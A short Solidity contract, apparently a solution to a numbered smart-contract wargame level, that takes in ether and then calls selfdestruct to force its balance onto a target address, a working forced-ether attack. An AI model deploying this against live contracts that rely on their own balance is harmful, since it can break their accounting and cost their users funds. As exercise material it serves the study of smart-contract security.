// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./07-attack.sol";

contract Attack07 {
    // make contract payable upon deployment
    constructor() payable {}

    // make contract payable for additional transactions
    receive() external payable {}

    // destroy contract, passing any funds to _contractAddress
    function attack(address payable _contractAddress) public {
        selfdestruct(_contractAddress);
    }
}
